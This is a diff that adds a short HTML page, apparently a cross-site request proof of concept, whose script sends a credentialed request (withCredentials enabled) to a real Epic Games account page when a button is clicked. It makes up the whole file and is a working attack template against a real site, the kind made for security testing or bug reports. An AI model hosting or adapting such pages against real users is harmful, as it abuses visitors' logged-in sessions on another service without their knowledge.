@@ -1,0 +1,21 @@
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://www.epicgames.com/account/personal?productName=epicgames&lang=en", true);
+        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
+        xhr.withCredentials = true;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
